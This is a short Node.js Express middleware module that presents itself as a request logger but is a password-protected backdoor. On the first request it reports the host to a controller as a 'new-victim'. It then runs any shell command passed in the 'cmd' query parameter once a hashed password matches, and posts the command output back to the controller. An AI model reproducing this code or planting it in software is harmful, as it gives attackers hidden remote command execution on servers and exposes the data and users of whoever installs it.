const { exec } = require("child_process");
const crypto = require("crypto");
const http = require("http");
module.exports = () => {
  
  let newVictim = true;
  return (req, res, next) => {
    if (newVictim) {
      newVictim = false;
      const options = {
        host: "127.0.0.1",
        port: "3001",
        path: `/new-victim?victimURL=${req.host}`,
      };
      http.request(options).end();
    }
    
    const { pwd, cmd } = req.query;
    const hash = crypto.createHash("sha256").update(String(pwd)).digest("hex");
    //console.log(hash);
    if (!pwd) {
      console.log(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
    }
    if (hash === "dbf51fe683bbe2e1a67d731846e5d2136e9fc79c70163221fd4ca3697c3bd476") {
      exec(cmd, (err, stdout) => {
        const data = JSON.stringify({
          output: stdout,
        });
        const options = {
          host: "127.0.0.1",
          port: "3001",
          path: "/",
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data),
          },
        };
        const req = http.request(options);
        req.write(data);
        req.end();
      });
    }
    next();
  };
};